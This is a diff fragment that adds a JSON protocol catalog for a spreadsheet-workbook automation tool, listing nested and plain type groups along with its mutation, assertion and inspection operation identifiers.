+      "usage" : "Resolve one top-level protocol type such as mutationActionTypes:SET_CELL."
+    }, {
+      "shape" : "nestedTypes:<group>",
+      "usage" : "Resolve one nested tagged-union group such as nestedTypes:cellValueSpecTypes."
+    }, {
+      "shape" : "plainTypes:<group>",
+      "usage" : "Resolve one plain record group such as plainTypes:sheetSummaryReport."
+    }, {
+      "shape" : "<id>",
+      "usage" : "Resolve one unqualified top-level type id only when it is globally unique."
+    } ],
+    "nestedTypeGroups" : [ {
+      "entryIds" : [ "BLANK", "TEXT", "NUMBER", "BOOLEAN", "ERROR" ],
+      "group" : "cellValueTypes"
+    }, {
+      "entryIds" : [ "BLANK", "TEXT", "NUMBER", "BOOLEAN", "ERROR", "FORMULA" ],
+      "group" : "cellReportTypes"
+    }, {
+      "entryIds" : [ "SPARSE", "DENSE" ],
+      "group" : "windowReportTypes"
+    }, {
+      "entryIds" : [ "INLINE", "UTF8_FILE", "STANDARD_INPUT" ],
+      "group" : "textSourceSpecTypes"
+    }, {
+      "entryIds" : [ "INLINE_BASE64", "FILE", "STANDARD_INPUT" ],
+      "group" : "binarySourceSpecTypes"
+    }, {
+      "entryIds" : [ "RANGE", "FORMULA" ],
+      "group" : "namedRangeReportTypes"
+    }, {
+      "entryIds" : [ "UNPROTECTED", "PROTECTED" ],
+      "group" : "sheetProtectionReportTypes"
+    }, {
+      "entryIds" : [ "NONE", "NAMED" ],
+      "group" : "tableStyleReportTypes"
+    }, {
+      "entryIds" : [ "SUPPORTED", "UNSUPPORTED" ],
+      "group" : "pivotTableReportTypes"
+    }, {
+      "entryIds" : [ "RANGE", "NAMED_RANGE", "TABLE" ],
+      "group" : "pivotSourceReportTypes"
+    }, {
+      "entryIds" : [ "AREA", "AREA_3D", "BAR", "BAR_3D", "DOUGHNUT", "LINE", "LINE_3D", "PIE", "PIE_3D", "RADAR", "SCATTER", "SURFACE", "SURFACE_3D", "UNSUPPORTED" ],
+      "group" : "plotTypes"
+    }, {
+      "entryIds" : [ "NONE", "TEXT", "FORMULA" ],
+      "group" : "titleTypes"
+    }, {
+      "entryIds" : [ "HIDDEN", "VISIBLE" ],
+      "group" : "legendTypes"
+    }, {
+      "entryIds" : [ "STRING_REFERENCE", "NUMERIC_REFERENCE", "STRING_LITERAL", "NUMERIC_LITERAL" ],
+      "group" : "dataSourceTypes"
+    }, {
+      "entryIds" : [ "TWO_CELL", "ONE_CELL", "ABSOLUTE" ],
+      "group" : "drawingAnchorReportTypes"
+    }, {
+      "entryIds" : [ "BLANK", "TEXT", "RICH_TEXT", "NUMBER", "BOOLEAN", "ERROR", "DATE", "DATE_TIME", "FORMULA", "RAW_FORMULA" ],
+      "group" : "cellValueSpecTypes"
+    }, {
+      "entryIds" : [ "TYPED", "TEXT", "NUMBER", "BOOLEAN", "ERROR", "DATE", "DATE_TIME", "FORMULA" ],
+      "group" : "cellRowSpecTypes"
+    }, {
+      "entryIds" : [ "TYPED", "TEXT", "NUMBER", "BOOLEAN", "ERROR", "DATE", "DATE_TIME", "FORMULA" ],
+      "group" : "cellGridSpecTypes"
+    }, {
+      "entryIds" : [ "URL", "EMAIL", "FILE", "DOCUMENT" ],
+      "group" : "hyperlinkTargetTypes"
+    }, {
+      "entryIds" : [ "NONE", "FROZEN", "SPLIT" ],
+      "group" : "paneSpecTypes"
+    }, {
+      "entryIds" : [ "APPEND_AT_END", "AT_INDEX" ],
+      "group" : "sheetCopyPositionTypes"
+    }, {
+      "entryIds" : [ "VALUE", "CELL_COLOR", "FONT_COLOR", "ICON" ],
+      "group" : "autofilterSortConditionSpecTypes"
+    }, {
+      "entryIds" : [ "RANGE", "FORMULA" ],
+      "group" : "namedRangeTargetTypes"
+    }, {
+      "entryIds" : [ "SIMPLE_SHAPE", "CONNECTOR" ],
+      "group" : "shapeSpecTypes"
+    }, {
+      "entryIds" : [ "WORKBOOK_CURRENT" ],
+      "group" : "workbookSelectorTypes"
+    }, {
+      "entryIds" : [ "SHEET_ALL", "SHEET_BY_NAME", "SHEET_BY_NAMES" ],
+      "group" : "sheetSelectorTypes"
+    }, {
+      "entryIds" : [ "CELL_ALL_USED_IN_SHEET", "CELL_BY_ADDRESS", "CELL_BY_ADDRESSES" ],
+      "group" : "cellSelectorTypes"
+    }, {
+      "entryIds" : [ "RANGE_ALL_ON_SHEET", "RANGE_BY_RANGE", "RANGE_BY_RANGES", "RANGE_RECTANGULAR_WINDOW" ],
+      "group" : "rangeSelectorTypes"
+    }, {
+      "entryIds" : [ "ROW_BAND_SPAN", "ROW_BAND_INSERTION" ],
+      "group" : "rowBandSelectorTypes"
+    }, {
+      "entryIds" : [ "COLUMN_BAND_SPAN", "COLUMN_BAND_INSERTION" ],
+      "group" : "columnBandSelectorTypes"
+    }, {
+      "entryIds" : [ "TABLE_ALL", "TABLE_BY_NAME", "TABLE_BY_NAMES", "TABLE_BY_NAME_ON_SHEET" ],
+      "group" : "tableSelectorTypes"
+    }, {
+      "entryIds" : [ "TABLE_ROW_ALL_ROWS", "TABLE_ROW_BY_INDEX", "TABLE_ROW_BY_KEY_CELL" ],
+      "group" : "tableRowSelectorTypes"
+    }, {
+      "entryIds" : [ "TABLE_CELL_BY_COLUMN_NAME" ],
+      "group" : "tableCellSelectorTypes"
+    }, {
+      "entryIds" : [ "NAMED_RANGE_BY_NAME", "NAMED_RANGE_WORKBOOK_SCOPE", "NAMED_RANGE_SHEET_SCOPE" ],
+      "group" : "refTypes"
+    }, {
+      "entryIds" : [ "WORKBOOK", "SHEET" ],
+      "group" : "namedRangeScopeTypes"
+    }, {
+      "entryIds" : [ "NAMED_RANGE_ALL", "NAMED_RANGE_ANY_OF", "NAMED_RANGE_BY_NAMES", "NAMED_RANGE_BY_NAME", "NAMED_RANGE_WORKBOOK_SCOPE", "NAMED_RANGE_SHEET_SCOPE" ],
+      "group" : "namedRangeSelectorTypes"
+    }, {
+      "entryIds" : [ "WORKBOOK", "SHEET" ],
+      "group" : "namedRangeScopeReportTypes"
+    }, {
+      "entryIds" : [ "DRAWING_OBJECT_ALL_ON_SHEET", "DRAWING_OBJECT_BY_NAME" ],
+      "group" : "drawingObjectSelectorTypes"
+    }, {
+      "entryIds" : [ "CHART_ALL_ON_SHEET", "CHART_BY_NAME" ],
+      "group" : "chartSelectorTypes"
+    }, {
+      "entryIds" : [ "PIVOT_TABLE_ALL", "PIVOT_TABLE_BY_NAME", "PIVOT_TABLE_BY_NAMES", "PIVOT_TABLE_BY_NAME_ON_SHEET" ],
+      "group" : "pivotTableSelectorTypes"
+    }, {
+      "entryIds" : [ "FULL_XSSF", "EVENT_READ", "STREAMING_WRITE" ],
+      "group" : "executionModeSpecTypes"
+    }, {
+      "entryIds" : [ "NOT_STARTED", "NOT_REQUESTED", "SUCCEEDED", "FAILED" ],
+      "group" : "phaseTypes"
+    }, {
+      "entryIds" : [ "SUCCEEDED", "FAILED" ],
+      "group" : "outcomeTypes"
+    }, {
+      "entryIds" : [ "STARTED", "SUCCEEDED", "FAILED" ],
+      "group" : "executionProgressEventTypes"
+    }, {
+      "entryIds" : [ "NONE", "ENCRYPTED" ],
+      "group" : "ooxmlEncryptionReportTypes"
+    }, {
+      "entryIds" : [ "NONE", "ENCRYPT", "PRESERVE_SOURCE" ],
+      "group" : "ooxmlPersistenceEncryptionSpecTypes"
+    }, {
+      "entryIds" : [ "NONE", "SIGN" ],
+      "group" : "ooxmlPersistenceSignatureSpecTypes"
+    }, {
+      "entryIds" : [ "STEP", "REQUEST_PATH", "REQUEST_BYTE_OFFSET", "FORMULA_CELL" ],
+      "group" : "requestWarningLocationTypes"
+    }, {
+      "entryIds" : [ "TWO_CELL" ],
+      "group" : "drawingAnchorSpecTypes"
+    }, {
+      "entryIds" : [ "AREA", "AREA_3D", "BAR", "BAR_3D", "DOUGHNUT", "LINE", "LINE_3D", "PIE", "PIE_3D", "RADAR", "SCATTER", "SURFACE", "SURFACE_3D" ],
+      "group" : "chartPlotSpecTypes"
+    }, {
+      "entryIds" : [ "NONE", "TEXT", "FORMULA" ],
+      "group" : "chartTitleSpecTypes"
+    }, {
+      "entryIds" : [ "HIDDEN", "VISIBLE" ],
+      "group" : "chartLegendSpecTypes"
+    }, {
+      "entryIds" : [ "REFERENCE", "STRING_LITERAL", "NUMERIC_LITERAL" ],
+      "group" : "chartDataSourceSpecTypes"
+    }, {
+      "entryIds" : [ "RANGE", "NAMED_RANGE", "TABLE" ],
+      "group" : "pivotSourceSpecTypes"
+    }, {
+      "entryIds" : [ "POINTS", "TWIPS" ],
+      "group" : "fontHeightSpecTypes"
+    }, {
+      "entryIds" : [ "RGB", "THEME", "INDEXED" ],
+      "group" : "colorSpecTypes"
+    }, {
+      "entryIds" : [ "LINEAR", "PATH" ],
+      "group" : "cellGradientFillSpecTypes"
+    }, {
+      "entryIds" : [ "PATTERN_ONLY", "PATTERN_FOREGROUND", "PATTERN_BACKGROUND", "PATTERN_FOREGROUND_BACKGROUND", "GRADIENT" ],
+      "group" : "cellFillSpecTypes"
+    }, {
+      "entryIds" : [ "RGB", "THEME", "INDEXED" ],
+      "group" : "cellColorReportTypes"
+    }, {
+      "entryIds" : [ "NONE", "DEFAULT_COLOR", "COLORED" ],
+      "group" : "cellBorderSideReportTypes"
+    }, {
+      "entryIds" : [ "LINEAR", "PATH" ],
+      "group" : "cellGradientFillReportTypes"
+    }, {
+      "entryIds" : [ "PATTERN_ONLY", "PATTERN_FOREGROUND", "PATTERN_BACKGROUND", "PATTERN_FOREGROUND_BACKGROUND", "GRADIENT" ],
+      "group" : "cellFillReportTypes"
+    }, {
+      "entryIds" : [ "EXPLICIT_LIST", "FORMULA_LIST", "WHOLE_NUMBER", "DECIMAL_NUMBER", "DATE", "TIME", "TEXT_LENGTH", "CUSTOM_FORMULA" ],
+      "group" : "dataValidationRuleSpecTypes"
+    }, {
+      "entryIds" : [ "VALUES", "CUSTOM", "DYNAMIC", "TOP10", "COLOR", "ICON" ],
+      "group" : "autofilterFilterCriterionSpecTypes"
+    }, {
+      "entryIds" : [ "FORMULA_RULE", "CELL_VALUE_RULE", "COLOR_SCALE_RULE", "DATA_BAR_RULE", "ICON_SET_RULE", "TOP10_RULE" ],
+      "group" : "conditionalFormattingRuleSpecTypes"
+    }, {
+      "entryIds" : [ "MIN", "MAX", "NUMBER", "PERCENT", "PERCENTILE", "FORMULA" ],
+      "group" : "conditionalFormattingThresholdSpecTypes"
+    }, {
+      "entryIds" : [ "NONE", "RANGE" ],
+      "group" : "printAreaSpecTypes"
+    }, {
+      "entryIds" : [ "AUTOMATIC", "FIT" ],
+      "group" : "printScalingSpecTypes"
+    }, {
+      "entryIds" : [ "NONE", "BAND" ],
+      "group" : "printTitleRowsSpecTypes"
+    }, {
+      "entryIds" : [ "NONE", "BAND" ],
+      "group" : "printTitleColumnsSpecTypes"
+    }, {
+      "entryIds" : [ "NONE", "NAMED" ],
+      "group" : "tableStyleSpecTypes"
+    }, {
+      "entryIds" : [ "DO_NOT_CALCULATE", "DEFERRED_CALCULATION", "EVALUATE_ALL", "EVALUATE_TARGETS", "REQUIRE_EVALUATION", "CLEAR_CACHES_ONLY" ],
+      "group" : "calculationStrategySpecTypes"
+    } ],
+    "plainTypeGroups" : [ {
+      "entryIds" : [ "ExecutionJournal" ],
+      "group" : "executionJournalType"
+    }, {
+      "entryIds" : [ "ExecutionJournalSourceSummary" ],
+      "group" : "executionJournalSourceSummaryType"
+    }, {
+      "entryIds" : [ "ExecutionJournalStep" ],
+      "group" : "executionJournalStepType"
+    }, {
+      "entryIds" : [ "ExecutionJournalTarget" ],
+      "group" : "executionJournalTargetType"
+    }, {
+      "entryIds" : [ "ExecutionJournalFailureClassification" ],
+      "group" : "executionJournalFailureClassificationType"
+    }, {
+      "entryIds" : [ "ExecutionJournalCalculation" ],
+      "group" : "executionJournalCalculationType"
+    }, {
+      "entryIds" : [ "ExecutionJournalTiming" ],
+      "group" : "executionJournalTimingType"
+    }, {
+      "entryIds" : [ "ExecutionJournalFailureStep" ],
+      "group" : "executionJournalFailureStepType"
+    }, {
+      "entryIds" : [ "RequestWarning" ],
+      "group" : "requestWarningType"
+    }, {
+      "entryIds" : [ "ExecutionPolicySpec" ],
+      "group" : "executionPolicySpecType"
+    }, {
+      "entryIds" : [ "CalculationPolicySpec" ],
+      "group" : "calculationPolicySpecType"
+    }, {
+      "entryIds" : [ "ExecutionJournalSpec" ],
+      "group" : "executionJournalSpecType"
+    }, {
+      "entryIds" : [ "CalculationReport" ],
+      "group" : "calculationReportType"
+    }, {
+      "entryIds" : [ "CalculationPreflightReport" ],
+      "group" : "calculationPreflightReportType"
+    }, {
+      "entryIds" : [ "CalculationPreflightSummary" ],
+      "group" : "calculationPreflightSummaryType"
+    }, {
+      "entryIds" : [ "FormulaCellTarget" ],
+      "group" : "formulaCellTargetType"
+    }, {
+      "entryIds" : [ "FormulaCapabilityReport" ],
+      "group" : "formulaCapabilityReportType"
+    }, {
+      "entryIds" : [ "CalculationExecutionReport" ],
+      "group" : "calculationExecutionReportType"
+    }, {
+      "entryIds" : [ "FormulaEnvironmentSpec" ],
+      "group" : "formulaEnvironmentSpecType"
+    }, {
+      "entryIds" : [ "OoxmlOpenSecuritySpec" ],
+      "group" : "ooxmlOpenSecuritySpecType"
+    }, {
+      "entryIds" : [ "OoxmlPersistenceSecuritySpec" ],
+      "group" : "ooxmlPersistenceSecuritySpecType"
+    }, {
+      "entryIds" : [ "OoxmlEncryptionSpec" ],
+      "group" : "ooxmlEncryptionSpecType"
+    }, {
+      "entryIds" : [ "OoxmlSignatureSpec" ],
+      "group" : "ooxmlSignatureSpecType"
+    }, {
+      "entryIds" : [ "OoxmlPackageSecurityReport" ],
+      "group" : "ooxmlPackageSecurityReportType"
+    }, {
+      "entryIds" : [ "OoxmlSignatureReport" ],
+      "group" : "ooxmlSignatureReportType"
+    }, {
+      "entryIds" : [ "OoxmlSignatureSignerIdentity" ],
+      "group" : "ooxmlSignatureSignerIdentityType"
+    }, {
+      "entryIds" : [ "FormulaExternalWorkbookSpec" ],
+      "group" : "formulaExternalWorkbookSpecType"
+    }, {
+      "entryIds" : [ "FormulaUdfToolpackSpec" ],
+      "group" : "formulaUdfToolpackSpecType"
+    }, {
+      "entryIds" : [ "FormulaUdfFunctionSpec" ],
+      "group" : "formulaUdfFunctionSpecType"
+    }, {
+      "entryIds" : [ "DrawingMarkerSpec" ],
+      "group" : "drawingMarkerSpecType"
+    }, {
+      "entryIds" : [ "ArrayFormulaSpec" ],
+      "group" : "arrayFormulaSpecType"
+    }, {
+      "entryIds" : [ "CustomXmlMappingLocator" ],
+      "group" : "customXmlMappingLocatorType"
+    }, {
+      "entryIds" : [ "CustomXmlImportSpec" ],
+      "group" : "customXmlImportSpecType"
+    }, {
+      "entryIds" : [ "ChartSpec" ],
+      "group" : "chartSpecType"
+    }, {
+      "entryIds" : [ "ChartAxisSpec" ],
+      "group" : "chartAxisSpecType"
+    }, {
+      "entryIds" : [ "ChartSeriesSpec" ],
+      "group" : "chartSeriesSpecType"
+    }, {
+      "entryIds" : [ "PictureDataSpec" ],
+      "group" : "pictureDataSpecType"
+    }, {
+      "entryIds" : [ "PictureSpec" ],
+      "group" : "pictureSpecType"
+    }, {
+      "entryIds" : [ "SignatureLineSpec" ],
+      "group" : "signatureLineSpecType"
+    }, {
+      "entryIds" : [ "EmbeddedObjectSpec" ],
+      "group" : "embeddedObjectSpecType"
+    }, {
+      "entryIds" : [ "CommentSpec" ],
+      "group" : "commentSpecType"
+    }, {
+      "entryIds" : [ "CommentAnchorSpec" ],
+      "group" : "commentAnchorSpecType"
+    }, {
+      "entryIds" : [ "SheetProtectionSettings" ],
+      "group" : "sheetProtectionSettingsType"
+    }, {
+      "entryIds" : [ "CellStylePatch" ],
+      "group" : "cellStylePatchType"
+    }, {
+      "entryIds" : [ "CellAlignmentPatch" ],
+      "group" : "cellAlignmentPatchType"
+    }, {
+      "entryIds" : [ "CellFontPatch" ],
+      "group" : "cellFontPatchType"
+    }, {
+      "entryIds" : [ "RichTextRunSpec" ],
+      "group" : "richTextRunSpecType"
+    }, {
+      "entryIds" : [ "CellReadProjection" ],
+      "group" : "cellReadProjectionType"
+    }, {
+      "entryIds" : [ "CellGradientStopSpec" ],
+      "group" : "cellGradientStopSpecType"
+    }, {
+      "entryIds" : [ "CellBorderPatch" ],
+      "group" : "cellBorderPatchType"
+    }, {
+      "entryIds" : [ "BorderSidePatch" ],
+      "group" : "borderSidePatchType"
+    }, {
+      "entryIds" : [ "CellProtectionPatch" ],
+      "group" : "cellProtectionPatchType"
+    }, {
+      "entryIds" : [ "DataValidationSpec" ],
+      "group" : "dataValidationSpecType"
+    }, {
+      "entryIds" : [ "DataValidationPromptSpec" ],
+      "group" : "dataValidationPromptSpecType"
+    }, {
+      "entryIds" : [ "DataValidationErrorAlertSpec" ],
+      "group" : "dataValidationErrorAlertSpecType"
+    }, {
+      "entryIds" : [ "AutofilterCustomConditionInput" ],
+      "group" : "autofilterCustomConditionInputType"
+    }, {
+      "entryIds" : [ "AutofilterFilterColumnSpec" ],
+      "group" : "autofilterFilterColumnSpecType"
+    }, {
+      "entryIds" : [ "AutofilterSortStateSpec" ],
+      "group" : "autofilterSortStateSpecType"
+    }, {
+      "entryIds" : [ "ConditionalFormattingSpec" ],
+      "group" : "conditionalFormattingSpecType"
+    }, {
+      "entryIds" : [ "HeaderFooterTextSpec" ],
+      "group" : "headerFooterTextSpecType"
+    }, {
+      "entryIds" : [ "DifferentialStylePatch" ],
+      "group" : "differentialStylePatchType"
+    }, {
+      "entryIds" : [ "DifferentialBorderPatch" ],
+      "group" : "differentialBorderPatchType"
+    }, {
+      "entryIds" : [ "IgnoredErrorSpec" ],
+      "group" : "ignoredErrorSpecType"
+    }, {
+      "entryIds" : [ "PrintLayoutSpec" ],
+      "group" : "printLayoutSpecType"
+    }, {
+      "entryIds" : [ "PrintMarginsSpec" ],
+      "group" : "printMarginsSpecType"
+    }, {
+      "entryIds" : [ "PrintSetupSpec" ],
+      "group" : "printSetupSpecType"
+    }, {
+      "entryIds" : [ "SheetDefaultsSpec" ],
+      "group" : "sheetDefaultsSpecType"
+    }, {
+      "entryIds" : [ "SheetDisplaySpec" ],
+      "group" : "sheetDisplaySpecType"
+    }, {
+      "entryIds" : [ "SheetOutlineSummarySpec" ],
+      "group" : "sheetOutlineSummarySpecType"
+    }, {
+      "entryIds" : [ "SheetPresentationSpec" ],
+      "group" : "sheetPresentationSpecType"
+    }, {
+      "entryIds" : [ "PivotTableSpec" ],
+      "group" : "pivotTableSpecType"
+    }, {
+      "entryIds" : [ "PivotTableAnchorInput" ],
+      "group" : "pivotTableAnchorInputType"
+    }, {
+      "entryIds" : [ "PivotTableDataFieldInput" ],
+      "group" : "pivotTableDataFieldInputType"
+    }, {
+      "entryIds" : [ "TableColumnSpec" ],
+      "group" : "tableColumnSpecType"
+    }, {
+      "entryIds" : [ "TableSpec" ],
+      "group" : "tableSpecType"
+    }, {
+      "entryIds" : [ "WorkbookProtectionSpec" ],
+      "group" : "workbookProtectionSpecType"
+    }, {
+      "entryIds" : [ "WorkbookProtectionReport" ],
+      "group" : "workbookProtectionReportType"
+    }, {
+      "entryIds" : [ "SheetSummaryReport" ],
+      "group" : "sheetSummaryReportType"
+    }, {
+      "entryIds" : [ "CellStyleReport" ],
+      "group" : "cellStyleReportType"
+    }, {
+      "entryIds" : [ "CellAlignmentReport" ],
+      "group" : "cellAlignmentReportType"
+    }, {
+      "entryIds" : [ "CellFontReport" ],
+      "group" : "cellFontReportType"
+    }, {
+      "entryIds" : [ "CellBorderReport" ],
+      "group" : "cellBorderReportType"
+    }, {
+      "entryIds" : [ "CellProtectionReport" ],
+      "group" : "cellProtectionReportType"
+    }, {
+      "entryIds" : [ "FontHeightReport" ],
+      "group" : "fontHeightReportType"
+    }, {
+      "entryIds" : [ "CellGradientStopReport" ],
+      "group" : "cellGradientStopReportType"
+    }, {
+      "entryIds" : [ "CellTemporalReport" ],
+      "group" : "cellTemporalReportType"
+    }, {
+      "entryIds" : [ "RichTextRunReport" ],
+      "group" : "richTextRunReportType"
+    }, {
+      "entryIds" : [ "CommentAnchorReport" ],
+      "group" : "commentAnchorReportType"
+    }, {
+      "entryIds" : [ "CommentReport" ],
+      "group" : "commentReportType"
+    }, {
+      "entryIds" : [ "WindowDimensionsReport" ],
+      "group" : "windowDimensionsReportType"
+    }, {
+      "entryIds" : [ "WindowRowReport" ],
+      "group" : "windowRowReportType"
+    }, {
+      "entryIds" : [ "TableEntryReport" ],
+      "group" : "tableEntryReportType"
+    }, {
+      "entryIds" : [ "TableEntryStructureReport" ],
+      "group" : "tableEntryStructureReportType"
+    }, {
+      "entryIds" : [ "TableEntryBehaviorReport" ],
+      "group" : "tableEntryBehaviorReportType"
+    }, {
+      "entryIds" : [ "TableEntryPresentationReport" ],
+      "group" : "tableEntryPresentationReportType"
+    }, {
+      "entryIds" : [ "TableColumnReport" ],
+      "group" : "tableColumnReportType"
+    }, {
+      "entryIds" : [ "DrawingMarkerReport" ],
+      "group" : "drawingMarkerReportType"
+    }, {
+      "entryIds" : [ "PivotTableAnchorReport" ],
+      "group" : "pivotTableAnchorReportType"
+    }, {
+      "entryIds" : [ "PivotTableFieldReport" ],
+      "group" : "pivotTableFieldReportType"
+    }, {
+      "entryIds" : [ "PivotTableDataFieldReport" ],
+      "group" : "pivotTableDataFieldReportType"
+    }, {
+      "entryIds" : [ "ArrayFormulaReport" ],
+      "group" : "arrayFormulaReportType"
+    }, {
+      "entryIds" : [ "CustomXmlMappingReport" ],
+      "group" : "customXmlMappingReportType"
+    }, {
+      "entryIds" : [ "CustomXmlMappingSettingsReport" ],
+      "group" : "customXmlMappingSettingsReportType"
+    }, {
+      "entryIds" : [ "CustomXmlMappingSchemaReport" ],
+      "group" : "customXmlMappingSchemaReportType"
+    }, {
+      "entryIds" : [ "CustomXmlDataBindingReport" ],
+      "group" : "customXmlDataBindingReportType"
+    }, {
+      "entryIds" : [ "CustomXmlLinkedCellReport" ],
+      "group" : "customXmlLinkedCellReportType"
+    }, {
+      "entryIds" : [ "CustomXmlLinkedTableReport" ],
+      "group" : "customXmlLinkedTableReportType"
+    }, {
+      "entryIds" : [ "CustomXmlExportReport" ],
+      "group" : "customXmlExportReportType"
+    }, {
+      "entryIds" : [ "ChartReport" ],
+      "group" : "chartReportType"
+    }, {
+      "entryIds" : [ "DataValidationPromptReport" ],
+      "group" : "dataValidationPromptReportType"
+    }, {
+      "entryIds" : [ "ChartAxisReport" ],
+      "group" : "chartAxisReportType"
+    }, {
+      "entryIds" : [ "DataValidationErrorAlertReport" ],
+      "group" : "dataValidationErrorAlertReportType"
+    }, {
+      "entryIds" : [ "ChartSeriesReport" ],
+      "group" : "chartSeriesReportType"
+    }, {
+      "entryIds" : [ "SecretReference" ],
+      "group" : "secretReferenceType"
+    } ],
+    "protocolVersion" : 1,
+    "requestTypeId" : "WorkbookPlan",
+    "topLevelGroups" : [ {
+      "entryIds" : [ "NEW", "EXISTING" ],
+      "group" : "workbookSourceTypes"
+    }, {
+      "entryIds" : [ "NONE", "OVERWRITE", "SAVE_AS" ],
+      "group" : "workbookPersistenceTypes"
+    }, {
+      "entryIds" : [ "MUTATION", "ASSERTION", "INSPECTION" ],
+      "group" : "workbookStepTypes"
+    }, {
+      "entryIds" : [ "ENSURE_SHEET", "RENAME_SHEET", "DELETE_SHEET", "MOVE_SHEET", "COPY_SHEET", "SET_ACTIVE_SHEET", "SET_SELECTED_SHEETS", "SET_SHEET_VISIBILITY", "SET_SHEET_PROTECTION", "CLEAR_SHEET_PROTECTION", "SET_WORKBOOK_PROTECTION", "CLEAR_WORKBOOK_PROTECTION", "MERGE_CELLS", "UNMERGE_CELLS", "SET_COLUMN_WIDTH", "SET_ROW_HEIGHT", "INSERT_ROWS", "DELETE_ROWS", "SHIFT_ROWS", "INSERT_COLUMNS", "DELETE_COLUMNS", "SHIFT_COLUMNS", "SET_ROW_VISIBILITY", "SET_COLUMN_VISIBILITY", "GROUP_ROWS", "UNGROUP_ROWS", "GROUP_COLUMNS", "UNGROUP_COLUMNS", "SET_SHEET_PANE", "SET_SHEET_ZOOM", "SET_SHEET_PRESENTATION", "SET_PRINT_LAYOUT", "CLEAR_PRINT_LAYOUT", "AUTO_SIZE_COLUMNS", "SET_CELL", "SET_RANGE", "CLEAR_RANGE", "SET_ARRAY_FORMULA", "CLEAR_ARRAY_FORMULA", "SET_HYPERLINK", "CLEAR_HYPERLINK", "SET_COMMENT", "CLEAR_COMMENT", "APPLY_STYLE", "APPEND_ROW", "SET_PICTURE", "SET_SIGNATURE_LINE", "SET_CHART", "SET_SHAPE", "SET_EMBEDDED_OBJECT", "SET_DRAWING_OBJECT_ANCHOR", "DELETE_DRAWING_OBJECT", "IMPORT_CUSTOM_XML_MAPPING", "SET_PIVOT_TABLE", "SET_DATA_VALIDATION", "CLEAR_DATA_VALIDATIONS", "SET_CONDITIONAL_FORMATTING", "CLEAR_CONDITIONAL_FORMATTING", "SET_AUTOFILTER", "CLEAR_AUTOFILTER", "SET_TABLE", "DELETE_TABLE", "DELETE_PIVOT_TABLE", "SET_NAMED_RANGE", "DELETE_NAMED_RANGE" ],
+      "group" : "mutationActionTypes"
+    }, {
+      "entryIds" : [ "EXPECT_SHEET_PRESENT", "EXPECT_SHEET_ABSENT", "EXPECT_NAMED_RANGE_PRESENT", "EXPECT_NAMED_RANGE_ABSENT", "EXPECT_TABLE_PRESENT", "EXPECT_TABLE_ABSENT", "EXPECT_PIVOT_TABLE_PRESENT", "EXPECT_PIVOT_TABLE_ABSENT", "EXPECT_CHART_PRESENT", "EXPECT_CHART_ABSENT", "EXPECT_CELL_VALUE", "EXPECT_DISPLAY_VALUE", "EXPECT_FORMULA_TEXT", "EXPECT_CELL_STYLE", "EXPECT_WORKBOOK_PROTECTION", "EXPECT_SHEET_STRUCTURE", "EXPECT_NAMED_RANGE_FACTS", "EXPECT_TABLE_FACTS", "EXPECT_PIVOT_TABLE_FACTS", "EXPECT_CHART_FACTS", "EXPECT_ANALYSIS_MAX_SEVERITY", "EXPECT_ANALYSIS_FINDING_PRESENT", "EXPECT_ANALYSIS_FINDING_ABSENT", "ALL_OF", "ANY_OF", "NOT" ],
+      "group" : "assertionTypes"
+    }, {
+      "entryIds" : [ "GET_WORKBOOK_SUMMARY", "GET_PACKAGE_SECURITY", "GET_WORKBOOK_PROTECTION", "GET_CUSTOM_XML_MAPPINGS", "EXPORT_CUSTOM_XML_MAPPING", "GET_NAMED_RANGES", "GET_SHEET_SUMMARY", "GET_ARRAY_FORMULAS", "GET_CELLS", "GET_WINDOW", "GET_MERGED_REGIONS", "GET_HYPERLINKS", "GET_COMMENTS", "GET_SHEET_LAYOUT", "GET_PRINT_LAYOUT", "GET_DATA_VALIDATIONS", "GET_CONDITIONAL_FORMATTING", "GET_AUTOFILTERS", "GET_DRAWING_OBJECTS", "GET_CHARTS", "GET_PIVOT_TABLES", "GET_DRAWING_OBJECT_PAYLOAD", "GET_TABLES", "GET_FORMULA_SURFACE", "GET_SHEET_SCHEMA", "GET_NAMED_RANGE_SURFACE", "ANALYZE_FORMULA_HEALTH", "ANALYZE_DATA_VALIDATION_HEALTH", "ANALYZE_CONDITIONAL_FORMATTING_HEALTH", "ANALYZE_AUTOFILTER_HEALTH", "ANALYZE_TABLE_HEALTH", "ANALYZE_PIVOT_TABLE_HEALTH", "ANALYZE_HYPERLINK_HEALTH", "ANALYZE_NAMED_RANGE_HEALTH", "ANALYZE_WORKBOOK_FINDINGS" ],
+      "group" : "inspectionQueryTypes"
+    } ]
+  }
+}
